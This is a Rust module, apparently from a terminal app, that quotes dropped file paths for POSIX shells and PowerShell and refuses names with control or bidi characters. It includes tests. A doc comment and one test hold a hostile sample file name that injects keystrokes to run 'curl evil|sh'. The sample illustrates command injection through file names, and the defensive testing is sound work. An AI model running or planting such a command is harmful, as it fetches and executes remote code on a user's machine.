//! Files dropped on the window from this computer (0.10's `useFileDrop` and `UploadDialog`):
//! what the pane under them does. On Files they upload into the folder there; on a server's
//! terminal a question asks which folder, starting with the one that terminal is in; on this
//! computer's terminal their paths are typed, quoted for its shell, as any terminal app does.

/// What reads the text typed into a terminal.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ShellKind {
    /// sh, bash, zsh, fish: everything but this computer's terminal on Windows.
    Posix,
    /// This computer's terminal on Windows (the backend starts PowerShell).
    PowerShell,
}

impl ShellKind {
    /// This computer's own terminal.
    pub fn here() -> ShellKind {
        if cfg!(windows) {
            ShellKind::PowerShell
        } else {
            ShellKind::Posix
        }
    }
}

/// `s` quoted for typing into a terminal, or `None` if it holds a control character. A
/// terminal takes those as keys before the shell sees any quotes, so a folder named
/// "a<Ctrl+U>curl evil|sh<Enter>" would run that.
///
/// The quoting holds in whatever shell is there: `'` and `\` go outside the quotes, escaped,
/// since fish reads `\'` inside them as a quote. In PowerShell `‘’‚‛` close a string as `'`
/// does, and each is escaped by doubling it.
pub fn typed_quote(s: &str, shell: ShellKind) -> Option<String> {
    if s.chars().any(|c| c.is_control()) {
        return None;
    }
    if shell == ShellKind::PowerShell {
        let mut out = String::with_capacity(s.len() + 2);
        out.push('\'');
        for c in s.chars() {
            if matches!(c, '\'' | '‘' | '’' | '‚' | '‛') {
                out.push(c);
            }
            out.push(c);
        }
        out.push('\'');
        return Some(out);
    }
    let mut out = String::with_capacity(s.len() + 2);
    let mut open = false;
    for c in s.chars() {
        if c == '\'' || c == '\\' {
            if open {
                out.push('\'');
                open = false;
            }
            out.push('\\');
            out.push(c);
        } else {
            if !open {
                out.push('\'');
                open = true;
            }
            out.push(c);
        }
    }
    if open {
        out.push('\'');
    }
    if out.is_empty() {
        out.push_str("''");
    }
    Some(out)
}

/// What dropping `paths` on this computer's terminal types: each quoted, a space between and
/// after, so the next word can follow. `None` when a name would act as keys there.
pub fn typed_paths(paths: &[String], shell: ShellKind) -> Option<String> {
    let quoted: Option<Vec<String>> = paths.iter().map(|p| typed_quote(p, shell)).collect();
    quoted.filter(|q| !q.is_empty()).map(|q| format!("{} ", q.join(" ")))
}

/// Said when a name can't be typed.
pub const CANT_TYPE: (&str, &str) = ("Can't type that name", "A file's name has control characters in it, which the terminal would take as keystrokes.");

/// Said when files are dropped where nothing takes them.
pub const NOWHERE: (&str, &str) = ("Drop files on a terminal or on Files", "On a server they're uploaded; you pick the folder.");

/// The last part of a path from this computer, with either slash.
pub fn local_name(path: &str) -> &str {
    path.trim_end_matches(['/', '\\']).rsplit(['/', '\\']).next().filter(|n| !n.is_empty()).unwrap_or(path)
}

/// The upload question's title: "Upload “notes.md” to web-1?", "Upload 3 items to web-1?".
pub fn upload_title(names: &[String], to: &str) -> String {
    match names {
        [one] => format!("Upload “{one}” to {to}?"),
        _ => format!("Upload {} items to {to}?", names.len()),
    }
}

/// The names under the title when there are several: the first four and how many more.
pub fn names_line(names: &[String]) -> Option<String> {
    if names.len() < 2 {
        return None;
    }
    let shown = names.iter().take(4).cloned().collect::<Vec<_>>().join(", ");
    Some(if names.len() > 4 { format!("{shown} and {} more", names.len() - 4) } else { shown })
}

/// The folder an upload goes to, as typed: trimmed, `None` while empty, or while it has a
/// control or bidi character (what isn't what it shows). A server's own `~` stays for the
/// backend to find (it lists it first).
pub fn folder(typed: &str) -> Option<&str> {
    Some(typed.trim()).filter(|t| !t.is_empty() && !crate::paths::has_hidden(t))
}

/// Where the upload's question starts: the folder the terminal's shell is in, as the server
/// said it (tmux, OSC 7), else home. The server's word: a folder with a control or bidi
/// character in it, which could show as another one, isn't taken.
pub fn start_folder(found: Option<String>) -> String {
    found.filter(|f| !f.trim().is_empty() && !crate::paths::has_hidden(f)).unwrap_or_else(|| "~".to_owned())
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The terminal's folder comes from the server: one that could show as another isn't
    /// where the question starts.
    #[test]
    fn the_upload_starts_in_the_terminals_folder_only_as_it_shows() {
        assert_eq!(start_folder(Some("/srv/www".into())), "/srv/www");
        assert_eq!(start_folder(Some("/home/deploy/отчёты".into())), "/home/deploy/отчёты");
        assert_eq!(start_folder(None), "~");
        assert_eq!(start_folder(Some(String::new())), "~");
        for odd in ["/srv/\u{202e}www", "/srv/www\n", "/srv/\u{1b}]8;;x", "/home/\u{2067}a", "/home/\u{200e}a", "/home/\u{061c}a"] {
            assert_eq!(start_folder(Some(odd.into())), "~", "{odd:?}");
        }
        // As typed: trimmed, and nothing hidden left inside.
        assert_eq!(folder("  /srv/www\n"), Some("/srv/www"));
        assert_eq!(folder("/srv/\u{202e}www"), None);
        assert_eq!(folder("/srv/a\u{7}b"), None);
    }

    #[test]
    fn names_are_quoted_for_the_shell_that_reads_them() {
        assert_eq!(typed_quote("/home/dev/notes.md", ShellKind::Posix).as_deref(), Some("'/home/dev/notes.md'"));
        assert_eq!(typed_quote("it's here", ShellKind::Posix).as_deref(), Some("'it'\\''s here'"));
        assert_eq!(typed_quote("a\\b", ShellKind::Posix).as_deref(), Some("'a'\\\\'b'"));
        assert_eq!(typed_quote("'", ShellKind::Posix).as_deref(), Some("\\'"));
        assert_eq!(typed_quote("", ShellKind::Posix).as_deref(), Some("''"));
        assert_eq!(typed_quote("C:\\Users\\dev\\it's.txt", ShellKind::PowerShell).as_deref(), Some("'C:\\Users\\dev\\it''s.txt'"));
        assert_eq!(typed_quote("a’b", ShellKind::PowerShell).as_deref(), Some("'a’’b'"));
    }

    #[test]
    fn a_name_that_would_act_as_keys_isnt_typed() {
        assert_eq!(typed_quote("a\u{15}curl evil|sh\r", ShellKind::Posix), None);
        assert_eq!(typed_quote("tab\there", ShellKind::PowerShell), None);
        assert_eq!(typed_quote("c1\u{9b}", ShellKind::Posix), None);
        assert_eq!(typed_paths(&["/ok".into(), "/bad\n".into()], ShellKind::Posix), None);
    }

    #[test]
    fn several_paths_are_typed_with_a_space_after() {
        assert_eq!(typed_paths(&["/a b".into(), "/c".into()], ShellKind::Posix).as_deref(), Some("'/a b' '/c' "));
        assert_eq!(typed_paths(&[], ShellKind::Posix), None);
    }

    #[test]
    fn the_upload_question() {
        let names = |n: &[&str]| n.iter().map(|s| (*s).to_owned()).collect::<Vec<_>>();
        assert_eq!(upload_title(&names(&["notes.md"]), "web-1"), "Upload “notes.md” to web-1?");
        assert_eq!(upload_title(&names(&["a", "b", "c"]), "web-1"), "Upload 3 items to web-1?");
        assert_eq!(names_line(&names(&["a"])), None);
        assert_eq!(names_line(&names(&["a", "b", "c", "d", "e", "f"])).as_deref(), Some("a, b, c, d and 2 more"));
        assert_eq!(local_name("/home/dev/report.pdf"), "report.pdf");
        assert_eq!(local_name("C:\\Users\\dev\\photos\\"), "photos");
        assert_eq!(folder("  /srv/www "), Some("/srv/www"));
        assert_eq!(folder("   "), None);
    }
}
